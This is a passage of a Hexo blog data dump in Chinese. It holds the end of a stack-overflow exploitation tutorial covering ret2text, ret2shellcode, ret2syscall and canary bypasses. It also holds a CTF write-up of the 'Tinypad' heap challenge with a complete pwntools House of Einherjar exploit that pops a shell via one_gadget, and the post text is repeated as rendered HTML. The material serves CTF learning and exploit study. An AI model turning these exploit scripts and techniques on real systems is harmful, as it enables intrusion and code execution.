src=\"./stack_overflow/stack2.png\" alt=\"stack\"></p>\n<p>通过栈溢出可以覆盖vuln()函数的ebp和返回地址。</p>\n<h2 id=\"ret2txt\"><a href=\"#ret2txt\" class=\"headerlink\" title=\"ret2txt\"></a>ret2txt</h2><p>ret2txt是对程序原有代码片段的利用，通过栈溢出<strong>将该函数的返回地址覆盖为程序原有的代码片段的地址</strong>（如后门函数的地址），从而get shell。</p>\n<h2 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h2><p>大部分程序都没有后门函数，因此ret2txt在许多场合下都是行不通的。因此需要我们自行写入一段能get shell的代码，这段代码就是shellcode。通过栈溢出<strong>将该函数的返回地址覆盖为shellcode</strong>即可get shell。</p>\n<p>pwntools中可以很方便的得到shellcode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;...&#x27;</span>  <span class=\"comment\">#设置系统的架构，如amd64，i386...</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>\n\n<p>然而ret2shellcode会受到<strong>NX保护</strong>的防护，在开启NX保护后，写入的shellcode所在的内存页不可执行，因此无法运行shellcode得到shell。</p>\n<h2 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h2><p>ret2syscall通过系统调用execve()执行execve(“/bin/sh”,NULL,NULL)进行get shell。</p>\n<p>执行系统调用execve(“/bin/sh”,NULL,NULL)仅需要将需要的参数传到<strong>寄存器</strong>，之后控制程序执行**int 0x80(32位)<strong>或</strong>syscall(64位)**。</p>\n<p>对于<strong>32位</strong>而言，需要将<strong>系统调用号</strong>传到<strong>eax</strong>寄存器，execve()的系统调用号为<strong>11</strong>；<strong>第一个参数”/bin/sh”的地址</strong>传到<strong>ebx</strong>寄存器；<strong>第二、第三个</strong>参数0传到<strong>ecx,edx</strong>寄存器。</p>\n<p>对于<strong>64位</strong>而言，需要将<strong>系统调用号</strong>传到<strong>rax</strong>寄存器，execve()的系统调用号为<strong>59</strong>；<strong>第一个参数”/bin/sh”的地址</strong>传到<strong>rdi</strong>寄存器；<strong>第二、第三个</strong>参数0传到<strong>rsi,rdx</strong>寄存器。</p>\n<p>如果有其他需要，也可以通过改变传入的系统调用号和参数执行其他的系统调用（如read、write、sigreturn）。</p>\n<p>要达到传参和调用syscall的目的，我们可以利用进一步<strong>利用程序中更小的代码片段</strong>（以后称为<strong>gadget</strong>）。</p>\n<p>通过ROPgadget可以找到程序中可以利用的gadget，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary 二进制文件名 --only 关键词(如pop、ret、eax、ebx...，关键词中可用|表示或) 可用于查找对应的gadget的地址</span><br><span class=\"line\">ROPgadget --binary 二进制文件名 --string 字符串 可用于查找对应字符串的地址</span><br><span class=\"line\"></span><br><span class=\"line\">后面可以接grep命令通过表达式缩小查找范围，除此之外ROPgadget还有其他用处。</span><br></pre></td></tr></table></figure>\n\n<p>通常找到的gadget大概是这样的：（如果能找到的话）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x080480c9:pop rbx; ret</span><br><span class=\"line\">0x0804808a:pop rbx; pop rdi; pop rsi; ret</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">0x08049421:int 0x80;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">0x080be408:&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>\n\n<p>通过在栈上布置pop指令，并在栈的后面布置要pop的参数，将该参数pop到对应寄存器中，由于通常选择<strong>后续紧跟ret</strong>的gadget，因此在执行了一个gadget后会ret，方便我们继续劫持栈。</p>\n<p>对于寄存器<strong>eax(rax)<strong>，还有其他的方式可以控制其值。一般来说，函数的</strong>返回值</strong>都会存放在寄存器eax(rax)中，据此可以通过函数返回值控制其值。如<strong>read()函数会返回其读入数据的长度</strong>，因此可以通过read()函数读入数据的长度来控制eax(rax)的值。</p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h2><p>Canary是针对栈溢出攻击的防护，其防护方式是在push入ebp(或rbp)后push入一个canary，在函数返回时根据canary的值与原来是否一致来判断是否发生栈溢出。但是Canary防护并非无懈可击，只要可以<strong>泄露出canary</strong>，并在栈溢出时在canary的位置用canary的值去覆盖，则不会被检测出发生栈溢出。<strong>值得注意的是，一般情况下，程序每次运行的canary都不相同。</strong></p>\n<p>一、覆盖’\\x00’</p>\n<p>通常<strong>字符串均以’\\x00’作为结束符</strong>，因此一旦’\\x00’被覆盖，程序将无法知道字符串正确的结束位置，若此时使用函数进行输出，则会继续输出字符串后面的内容，直到出现’\\x00’。因此如果有一个栈上的字符串和输出函数，通过栈溢出漏洞保证**在canary之前不会出现’\\x00’**，则输出函数会将后续的canary泄露出来。</p>\n<p>二、泄露fs:28h</p>\n<p>由于在函数结束之后需要对canary的值进行验证，因此程序中一定有一个地方存放着canary的值用于验证。通常在汇编代码中可以找到用来验证的值，这个值是fs:28h，如果任意读则可以从中泄露出canary，在栈溢出时填入canary。</p>\n<p>fs:28h与libc基地址的偏移是固定的，通过爆破或其他方法可以得到fs:28h的位置。</p>\n<p>三、覆写canary</p>\n<p>这个方法也是对canary的验证值fs:28h进行攻击，但是是通过将canary的验证值修改为一个我们知道的值，然后在栈溢出时将canary覆盖为这个值。这个攻击的前提是可以写到fs:28h的位置。</p>\n<p>四、逐字节爆破</p>\n<p>在部分情况下，程序重启之后的canary值保持不变（常常是在BROP的题目中），这时候就可以采用逐字节爆破的方法去得到canary。</p>\n<p>从低字节开始逐个字节进行爆破，当一个字节爆破成功时，程序不会异常关闭，此时就可以知道这一个字节的值，可以继续爆破下一个字节；反之，程序会异常关闭，这样就知道这次尝试是错的。</p>\n<p>五、stack smashing</p>\n<p>有时候我们可能无法绕过canary保护，但利用canary保护，我们也可以泄露一些信息。</p>\n<p>stack smashing是一种利用canary保护泄露信息的攻击。在程序检测到canary被修改时，程序不会继续返回，而是调用函数__stack_chk_fail打印错误信息。如：*** stack smashing detected ***: ./pwn terminated</p>\n<p>可以看到__stack_chk_fail打印的错误信息中就包含程序的名字（pwn）。其实__stack_chk_fail会打印<strong>argv[0]这个指针所指向的字符串</strong>，一般来说这个字符串是程序的名字。而<strong>argv[0]一般存放在栈上</strong>，通过<strong>栈溢出覆盖argv[0]<strong>即可泄露出其他信息（即使程序知道canary被修改了，栈溢出覆盖的数据</strong>依旧会被覆盖</strong>）。</p>"},{"title":"Tinypad","date":"2023-01-02T11:54:26.000Z","_content":"\n这是道House of Einherjar\n\n<!--more-->\n\n64位堆题，NO PIE，其他都开了。\n\nHouse of Einherjar\n\n在read_until函数中存在off by null，当读入size字节并且没有遇到结束符时，会**多写一个\\x00**。\n\n```c\nunsigned __int64 __fastcall read_until(__int64 buf, unsigned __int64 size, unsigned int end_char)\n{\n  unsigned __int64 i; // [rsp+28h] [rbp-18h]\n  __int64 v6; // [rsp+30h] [rbp-10h]\n\n  for ( i = 0LL; i < size; ++i )\n  {\n    v6 = read_n(0, buf + i, 1uLL);\n    if ( v6 < 0 )\n      return -1LL;\n    if ( !v6 || *(char *)(buf + i) == end_char )\n      break;\n  }\n  *(_BYTE *)(buf + i) = 0;                      // 正常结束循环会多写一个\\x00，off by null\n  if ( i == size && *(_BYTE *)(size - 1 + buf) != 10 )\n    dummyinput(end_char);\n  return i;\n}\n```\n\ntinypad结构体:\n\n```c\nstruct tinypad\n{\n    int size;   //8byte\n    char content[size]; //malloc\n}\n```\n\n这个程序具有add、free、edit、show功能，其中show是程序自带的，在输入命令之前会先输出所有的content。\n\n需要重点关注的是tinypad的数组，以tinypad[16*idx+0x100/0x108]的形式利用。idx==1也就是第一个tinypad的size是在tinypad[0x110]的位置，每一项总共也就0x10的空间，而前面0x110的空间是留给edit功能的。\n\n由于存在off by null，因此我们可以修改prev_size和prev_inuse并触发前向合并来造成overlapping。\n\n最多能同时有4个chunk，最大的size为0x100。\n\nedit功能比较复杂，在检验输入之后，会将该chunk用strcpy复制到tinypad偏移为0的位置进行操作，并且**edit的长度和已经写入的字符串的长度相等**，写入完成后才会将tinypad处的内容strcpy到chunk。由于strcpy会被\\x00截断，因此如果该chunk中有地址的话，edit的长度会比较小。\n\n```c\nwrite_n((__int64)\"(INDEX)>>> \", 11LL);    // Edit\nidx = read_int();\nif ( idx <= 0 || idx > 4 )\n    goto LABEL_29;\nif ( !*(_QWORD *)&tinypad[16 * idx + 0xF0] )\n    goto LABEL_31;\nc = '0';\nstrcpy(tinypad, *(const char **)&tinypad[16 * idx + 0xF8]);// edit时会将其复制到tinypad中进行操作\nwhile ( toupper(c) != 'Y' )\n{\n    write_n((__int64)\"CONTENT: \", 9LL);\n    v6 = strlen(tinypad);\n    writeln((__int64)tinypad, v6);          // 会先输出原有的content\n    write_n((__int64)\"(CONTENT)>>> \", 13LL);\n    len = strlen(*(const char **)&tinypad[16 * idx + 0xF8]);// 直接取字符串的len值作为长度\n    read_until((__int64)tinypad, len, '\\n');// off by null\n    writeln((__int64)\"Is it OK?\", 9LL);\n    write_n((__int64)\"(Y/n)>>> \", 9LL);\n    read_until((__int64)&c, 1uLL, 0xAu);\n}\nstrcpy(*(char **)&tinypad[16 * idx + 0xF8], tinypad);\nwriteln((__int64)\"\\nEdited.\", 8LL);\n```\n\n同时释放的函数处也有些小问题（UAF），释放之后没有清空chunk指针，有悬挂指针。虽然有标志位让其在edit的时无法通过检查，但在菜单处没有检查，会照常输出content的内容。\n\n```c\nfree(*(void **)&tinypad[16 * idx + 0xF8]);// 释放但没请0，不过有标志位edit时也能检查到，不过会照常输出\n*(_QWORD *)&tinypad[16 * idx + 0xF0] = 0LL;// 0代表没使用\nwriteln((__int64)\"\\nDeleted.\", 9LL);\n```\n\n在这里可以通过UAF泄露出当前的heapbase和libcbase。\n\n一开始尝试释放两个unsorted bin chunk后，**一个的fd指向的是一个堆地址（下一个chunk的地址），另一个fd指向的是unsorted bin头**，通过菜单显示出来。在实际中发现这样需要让两个释放的chunk不连续，并且中间要隔着一个size<0x100的chunk，否则堆地址的低位会是\\x00，输出不出来。\n\n其实也可以通过释放两个fast bin chunk来泄露堆地址，释放一个unsorted bin chunk来泄露libc。\n\n在泄露了libcbase和heapbase之后，可以通过House of Einherjar实现overlapping。之后通过fast bin attack修改__malloc_hook为onegadget应该就可以get shell了。不过由于此处edit的特殊性，无法用于修改hook（hook处全为'\\x00'，因此len为0，不能写入东西），所以尝试overlapping到tinypad的位置，控制堆指针获得任意写。\n\n这里可以利用edit来在tinypad处构造fake chunk，由于**edit会先在tinypad处写入数据**，因此我们可以在此处写入。除此之外**tinypad[0x110]开始就存放了chunk，tinypad[0x110]就是第一个chunk的size**，我们可以不用构造next chunk size。\n\n为了控制堆指针，我们可以在0x602060处构造fake chunk，让其覆盖到堆指针(size位要为0x101)，并让第三个chunk的size为0x100。\n\n```python\n# House of einherjar\n\ntinypad=0x602040\n\nfake_chunk = tinypad+0x20 #0x602060\noffset=heapbase-fake_chunk+0x50 #计算释放的idx2和fakechunk的偏移\n\nadd(0x48,'a'*0x48)#idx1 用于off by null\nadd(0xf0,'b'*0xf0)#idx2 用于触发house of einherjar\nadd(0x100,'c'*0x100)#idx3 让0x602160的位置是0x100，使得fake chunk的size和next chunk的presize一致\nadd(0xf0,'d'*0xf0)#idx4\n\n#construct fake chunk\npayload='a'*0x20+p64(0)+p64(0x101)+p64(fake_chunk)+p64(fake_chunk)#fd和bk指向自己，绕过检查\nedit(1,payload)\n\nfree(1)\npayload='a'*0x40+p64(offset)#off by null\nadd(0x48,payload)\n\nfree(2)# 触发house of einherjar\n\npayload='a'*0x20+p64(0)+p64(0x101)+p64(malloc_hook+0x10+88)+p64(malloc_hook+0x10+88)\n#不知道为什么如果不修改不能malloc，可能fd或者bk有错?\nedit(3,payload)\n\n```\n\n在这之后，fake chunk就被释放合并到了unsorted bin中，下一次malloc会从中获取内存。\n\n![hoe](./tinypad/hoe.jpg)\n\n然后就可以尝试get shell了，但这里有有些麻烦，由于开启了FULL RELRO，因此无法改写GOT表项，并且程序没有使用stdio，对FILE_IO的利用也不行，不过在libc中有一个全局变量**__environ**，储存着该程序环境变量的地址，而环境变量是储存在**栈**上的，所以可以泄露栈地址，所以可以控制rip。\n\n**在__environ中的第一个位置上有一个栈地址，而这个栈地址距离main_ret（主程序返回操作）的距离是一个固定的偏移：8*30(*__environ-240)**，所以这里就可以找到main_ret的地址，之后我们修改它执行one_gadget即可getshell。\n\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn2\")\nlibc=ELF(\"./libc-2.23.so\")\np=process(\"./pwn2\")\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\ndef add(size,content):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('a')\n\tp.recvuntil(\"(SIZE)>>> \")\n\tp.sendline(str(size))\n\tp.recvuntil(\"(CONTENT)>>> \")\n\tp.sendline(str(content))\n\ndef free(idx):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('d')\n\tp.recvuntil(\"(INDEX)>>> \")\n\tp.sendline(str(idx))\n\ndef edit(idx,content):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('e')\n\tp.recvuntil(\"(INDEX)>>> \")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"(CONTENT)>>> \")\n\tp.sendline(str(content))\n\tp.recvuntil(\"(Y/n)>>> \")\n\tp.sendline(\"y\")\n\t#return data\n\ndef show(idx):\n\tp.recvuntil(\" #   INDEX: \"+str(idx)+'\\n')\n\tp.recvuntil(\" # CONTENT: \")\n\t\n\nadd(0xf0,'a'*0xf0)#idx1\nadd(0x60,'b'*0x60)#idx2\nadd(0xf8,'c'*0xf8)#idx3\nadd(0xf0,'d'*0xf0)#idx4\n\n\n# leak libc and heap base\nfree(3)\nfree(1)\n\nshow(1)\nheapbase=u64(p.recvuntil('\\n')[1:-1].ljust(7,'\\x00').rjust(8,'\\x00'))-0x100\nlog.info(hex(heapbase))\n\n\nshow(3)\nmalloc_hook=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))-88-0x10\nlibcbase=malloc_hook-libc.sym['__malloc_hook']\nlog.info(hex(libcbase))\n\n\nfree(2)\nfree(4)\n\n# House of einherjar\n\ntinypad=0x602040\n\nfake_chunk = tinypad+0x20\noffset=heapbase-fake_chunk+0x50\n\nadd(0x48,'a'*0x48)#idx1\nadd(0xf0,'b'*0xf0)#idx2\nadd(0x100,'c'*0x100)#idx3\nadd(0xf0,'d'*0xf0)#idx4\n\n#construct fake chunk\npayload='a'*0x20+p64(0)+p64(0x101)+p64(fake_chunk)+p64(fake_chunk)\nedit(1,payload)\n\nfree(1)\npayload='a'*0x40+p64(offset)\nadd(0x48,payload)\n\nfree(2)\n\npayload='a'*0x20+p64(0)+p64(0x101)+p64(malloc_hook+88+0x10)+p64(malloc_hook+88+0x10)\nedit(3,payload)\n\n#get shell\n\none_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]\n\n#reset heap addr\nenviron_addr=libcbase+libc.symbols['__environ']\nlog,info(hex(environ_addr))\npayload='a'*(0x100-0x30)+p64(0x100)+p64(environ_addr)+p64(0x100)+p64(0x602148)\n\nadd(0xf8,payload)\n\n#leak __environ\nshow(1)\nstack_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nlog.info(\"stack: \"+hex(stack_addr))\n\n\n\nedit(2,p64(stack_addr-240))\nedit(1,p64(libcbase+one_gadget[0]))\n\n#debug()\n\np.recvuntil(\"(CMD)>>> \")\np.sendline('q')\n\np.interactive()\n\n# 0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\n# constraints:\n#   rax == NULL\n\n# 0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\n# constraints:\n#   [rsp+0x30] == NULL\n\n# 0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\n# constraints:\n#   [rsp+0x50] == NULL\n\n# 0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\n# constraints:\n#   [rsp+0x70] == NULL\n\n```\n","source":"_posts/tinypad.md","raw":"---\ntitle: Tinypad\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- house_of_xxx\n---\n\n这是道House of Einherjar\n\n<!--more-->\n\n64位堆题，NO PIE，其他都开了。\n\nHouse of Einherjar\n\n在read_until函数中存在off by null，当读入size字节并且没有遇到结束符时，会**多写一个\\x00**。\n\n```c\nunsigned __int64 __fastcall read_until(__int64 buf, unsigned __int64 size, unsigned int end_char)\n{\n  unsigned __int64 i; // [rsp+28h] [rbp-18h]\n  __int64 v6; // [rsp+30h] [rbp-10h]\n\n  for ( i = 0LL; i < size; ++i )\n  {\n    v6 = read_n(0, buf + i, 1uLL);\n    if ( v6 < 0 )\n      return -1LL;\n    if ( !v6 || *(char *)(buf + i) == end_char )\n      break;\n  }\n  *(_BYTE *)(buf + i) = 0;                      // 正常结束循环会多写一个\\x00，off by null\n  if ( i == size && *(_BYTE *)(size - 1 + buf) != 10 )\n    dummyinput(end_char);\n  return i;\n}\n```\n\ntinypad结构体:\n\n```c\nstruct tinypad\n{\n    int size;   //8byte\n    char content[size]; //malloc\n}\n```\n\n这个程序具有add、free、edit、show功能，其中show是程序自带的，在输入命令之前会先输出所有的content。\n\n需要重点关注的是tinypad的数组，以tinypad[16*idx+0x100/0x108]的形式利用。idx==1也就是第一个tinypad的size是在tinypad[0x110]的位置，每一项总共也就0x10的空间，而前面0x110的空间是留给edit功能的。\n\n由于存在off by null，因此我们可以修改prev_size和prev_inuse并触发前向合并来造成overlapping。\n\n最多能同时有4个chunk，最大的size为0x100。\n\nedit功能比较复杂，在检验输入之后，会将该chunk用strcpy复制到tinypad偏移为0的位置进行操作，并且**edit的长度和已经写入的字符串的长度相等**，写入完成后才会将tinypad处的内容strcpy到chunk。由于strcpy会被\\x00截断，因此如果该chunk中有地址的话，edit的长度会比较小。\n\n```c\nwrite_n((__int64)\"(INDEX)>>> \", 11LL);    // Edit\nidx = read_int();\nif ( idx <= 0 || idx > 4 )\n    goto LABEL_29;\nif ( !*(_QWORD *)&tinypad[16 * idx + 0xF0] )\n    goto LABEL_31;\nc = '0';\nstrcpy(tinypad, *(const char **)&tinypad[16 * idx + 0xF8]);// edit时会将其复制到tinypad中进行操作\nwhile ( toupper(c) != 'Y' )\n{\n    write_n((__int64)\"CONTENT: \", 9LL);\n    v6 = strlen(tinypad);\n    writeln((__int64)tinypad, v6);          // 会先输出原有的content\n    write_n((__int64)\"(CONTENT)>>> \", 13LL);\n    len = strlen(*(const char **)&tinypad[16 * idx + 0xF8]);// 直接取字符串的len值作为长度\n    read_until((__int64)tinypad, len, '\\n');// off by null\n    writeln((__int64)\"Is it OK?\", 9LL);\n    write_n((__int64)\"(Y/n)>>> \", 9LL);\n    read_until((__int64)&c, 1uLL, 0xAu);\n}\nstrcpy(*(char **)&tinypad[16 * idx + 0xF8], tinypad);\nwriteln((__int64)\"\\nEdited.\", 8LL);\n```\n\n同时释放的函数处也有些小问题（UAF），释放之后没有清空chunk指针，有悬挂指针。虽然有标志位让其在edit的时无法通过检查，但在菜单处没有检查，会照常输出content的内容。\n\n```c\nfree(*(void **)&tinypad[16 * idx + 0xF8]);// 释放但没请0，不过有标志位edit时也能检查到，不过会照常输出\n*(_QWORD *)&tinypad[16 * idx + 0xF0] = 0LL;// 0代表没使用\nwriteln((__int64)\"\\nDeleted.\", 9LL);\n```\n\n在这里可以通过UAF泄露出当前的heapbase和libcbase。\n\n一开始尝试释放两个unsorted bin chunk后，**一个的fd指向的是一个堆地址（下一个chunk的地址），另一个fd指向的是unsorted bin头**，通过菜单显示出来。在实际中发现这样需要让两个释放的chunk不连续，并且中间要隔着一个size<0x100的chunk，否则堆地址的低位会是\\x00，输出不出来。\n\n其实也可以通过释放两个fast bin chunk来泄露堆地址，释放一个unsorted bin chunk来泄露libc。\n\n在泄露了libcbase和heapbase之后，可以通过House of Einherjar实现overlapping。之后通过fast bin attack修改__malloc_hook为onegadget应该就可以get shell了。不过由于此处edit的特殊性，无法用于修改hook（hook处全为'\\x00'，因此len为0，不能写入东西），所以尝试overlapping到tinypad的位置，控制堆指针获得任意写。\n\n这里可以利用edit来在tinypad处构造fake chunk，由于**edit会先在tinypad处写入数据**，因此我们可以在此处写入。除此之外**tinypad[0x110]开始就存放了chunk，tinypad[0x110]就是第一个chunk的size**，我们可以不用构造next chunk size。\n\n为了控制堆指针，我们可以在0x602060处构造fake chunk，让其覆盖到堆指针(size位要为0x101)，并让第三个chunk的size为0x100。\n\n```python\n# House of einherjar\n\ntinypad=0x602040\n\nfake_chunk = tinypad+0x20 #0x602060\noffset=heapbase-fake_chunk+0x50 #计算释放的idx2和fakechunk的偏移\n\nadd(0x48,'a'*0x48)#idx1 用于off by null\nadd(0xf0,'b'*0xf0)#idx2 用于触发house of einherjar\nadd(0x100,'c'*0x100)#idx3 让0x602160的位置是0x100，使得fake chunk的size和next chunk的presize一致\nadd(0xf0,'d'*0xf0)#idx4\n\n#construct fake chunk\npayload='a'*0x20+p64(0)+p64(0x101)+p64(fake_chunk)+p64(fake_chunk)#fd和bk指向自己，绕过检查\nedit(1,payload)\n\nfree(1)\npayload='a'*0x40+p64(offset)#off by null\nadd(0x48,payload)\n\nfree(2)# 触发house of einherjar\n\npayload='a'*0x20+p64(0)+p64(0x101)+p64(malloc_hook+0x10+88)+p64(malloc_hook+0x10+88)\n#不知道为什么如果不修改不能malloc，可能fd或者bk有错?\nedit(3,payload)\n\n```\n\n在这之后，fake chunk就被释放合并到了unsorted bin中，下一次malloc会从中获取内存。\n\n![hoe](./tinypad/hoe.jpg)\n\n然后就可以尝试get shell了，但这里有有些麻烦，由于开启了FULL RELRO，因此无法改写GOT表项，并且程序没有使用stdio，对FILE_IO的利用也不行，不过在libc中有一个全局变量**__environ**，储存着该程序环境变量的地址，而环境变量是储存在**栈**上的，所以可以泄露栈地址，所以可以控制rip。\n\n**在__environ中的第一个位置上有一个栈地址，而这个栈地址距离main_ret（主程序返回操作）的距离是一个固定的偏移：8*30(*__environ-240)**，所以这里就可以找到main_ret的地址，之后我们修改它执行one_gadget即可getshell。\n\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./pwn2\")\nlibc=ELF(\"./libc-2.23.so\")\np=process(\"./pwn2\")\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\ndef add(size,content):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('a')\n\tp.recvuntil(\"(SIZE)>>> \")\n\tp.sendline(str(size))\n\tp.recvuntil(\"(CONTENT)>>> \")\n\tp.sendline(str(content))\n\ndef free(idx):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('d')\n\tp.recvuntil(\"(INDEX)>>> \")\n\tp.sendline(str(idx))\n\ndef edit(idx,content):\n\tp.recvuntil(\"(CMD)>>> \")\n\tp.sendline('e')\n\tp.recvuntil(\"(INDEX)>>> \")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"(CONTENT)>>> \")\n\tp.sendline(str(content))\n\tp.recvuntil(\"(Y/n)>>> \")\n\tp.sendline(\"y\")\n\t#return data\n\ndef show(idx):\n\tp.recvuntil(\" #   INDEX: \"+str(idx)+'\\n')\n\tp.recvuntil(\" # CONTENT: \")\n\t\n\nadd(0xf0,'a'*0xf0)#idx1\nadd(0x60,'b'*0x60)#idx2\nadd(0xf8,'c'*0xf8)#idx3\nadd(0xf0,'d'*0xf0)#idx4\n\n\n# leak libc and heap base\nfree(3)\nfree(1)\n\nshow(1)\nheapbase=u64(p.recvuntil('\\n')[1:-1].ljust(7,'\\x00').rjust(8,'\\x00'))-0x100\nlog.info(hex(heapbase))\n\n\nshow(3)\nmalloc_hook=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))-88-0x10\nlibcbase=malloc_hook-libc.sym['__malloc_hook']\nlog.info(hex(libcbase))\n\n\nfree(2)\nfree(4)\n\n# House of einherjar\n\ntinypad=0x602040\n\nfake_chunk = tinypad+0x20\noffset=heapbase-fake_chunk+0x50\n\nadd(0x48,'a'*0x48)#idx1\nadd(0xf0,'b'*0xf0)#idx2\nadd(0x100,'c'*0x100)#idx3\nadd(0xf0,'d'*0xf0)#idx4\n\n#construct fake chunk\npayload='a'*0x20+p64(0)+p64(0x101)+p64(fake_chunk)+p64(fake_chunk)\nedit(1,payload)\n\nfree(1)\npayload='a'*0x40+p64(offset)\nadd(0x48,payload)\n\nfree(2)\n\npayload='a'*0x20+p64(0)+p64(0x101)+p64(malloc_hook+88+0x10)+p64(malloc_hook+88+0x10)\nedit(3,payload)\n\n#get shell\n\none_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]\n\n#reset heap addr\nenviron_addr=libcbase+libc.symbols['__environ']\nlog,info(hex(environ_addr))\npayload='a'*(0x100-0x30)+p64(0x100)+p64(environ_addr)+p64(0x100)+p64(0x602148)\n\nadd(0xf8,payload)\n\n#leak __environ\nshow(1)\nstack_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nlog.info(\"stack: \"+hex(stack_addr))\n\n\n\nedit(2,p64(stack_addr-240))\nedit(1,p64(libcbase+one_gadget[0]))\n\n#debug()\n\np.recvuntil(\"(CMD)>>> \")\np.sendline('q')\n\np.interactive()\n\n# 0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\n# constraints:\n#   rax == NULL\n\n# 0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\n# constraints:\n#   [rsp+0x30] == NULL\n\n# 0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\n# constraints:\n#   [rsp+0x50] == NULL\n\n# 0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\n# constraints:\n#   [rsp+0x70] == NULL\n\n```\n","slug":"tinypad","published":1,"updated":"2023-01-02T16:02:26.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagn006d5oud9su8b57a","content":"<p>这是道House of Einherjar</p>\n<span id=\"more\"></span>\n\n<p>64位堆题，NO PIE，其他都开了。</p>\n<p>House of Einherjar</p>\n<p>在read_until函数中存在off by null，当读入size字节并且没有遇到结束符时，会<strong>多写一个\\x00</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">read_until</span><span class=\"params\">(__int64 buf, <span class=\"type\">unsigned</span> __int64 size, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> end_char)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 i; <span class=\"comment\">// [rsp+28h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i &lt; size; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = read_n(<span class=\"number\">0</span>, buf + i, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v6 || *(<span class=\"type\">char</span> *)(buf + i) == end_char )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)(buf + i) = <span class=\"number\">0</span>;                      <span class=\"comment\">// 正常结束循环会多写一个\\x00，off by null</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i == size &amp;&amp; *(_BYTE *)(size - <span class=\"number\">1</span> + buf) != <span class=\"number\">10</span> )</span><br><span class=\"line\">    dummyinput(end_char);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tinypad结构体:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 